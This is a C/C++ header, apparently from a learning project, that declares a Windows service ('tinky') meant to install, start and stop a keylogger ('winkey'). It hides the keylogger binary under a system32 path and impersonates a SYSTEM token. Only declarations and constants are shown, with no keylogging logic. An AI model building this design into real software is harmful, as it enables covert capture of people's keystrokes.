#pragma once

#define UNICODE // Keep ?
#define _UNICODE // Keep ?

//#include "winMandatory.h"
#include <windows.h>
#include <iostream>

//#include "unicode.h"

// =============== Magic variables ========== //
#define WINKEY_STOP TEXT("Global\\stop_winkey_process")  // NameSpace Global ?
#define SVC_NAME TEXT("tinky")
#define KYLG_NAME TEXT("winkey")
#define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
// global {
#define NO_ARGS NULL
#define NO_NAME NULL
#define NONE 0
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
//#pragma pack(1)
typedef struct tinky {
	// install {
	SC_HANDLE	scmHandler;
	SC_HANDLE	serviceHandler;
	// }

	// Global {
	char	*winkeyExePath;
	char	*tinkyExePath;
	HANDLE	systemToken;
	// }

	// start {
	SERVICE_STATUS			svcStatus;
	SERVICE_STATUS_HANDLE	svcStatusHandle;
	HANDLE					tinkyStopEventHandle;
	HANDLE					winkeyStopEventHandle;
	STARTUPINFOW			startupInfo;
	PROCESS_INFORMATION		processInfo;
	// }
}	tinky_t;
//#pragma pack()
// ============================================= //

// =============== cmdLineControlManaged.cpp =============== //
BYTE initControl(void);
// =============== service control managed =============== //
int startedBySCM(void);
// =============== impersonate.cpp =============== //
void impersonate(void);
// =============== install.cpp =============== //
int openSCM(DWORD desiredAccess);
int install(void);
// =============== start.cpp =============== //
int start(void);
// =============== stop.cpp =============== //
int stop(void);
// =============== delete.cpp =============== //
int uninstall(void); /* delete() was taken..lol */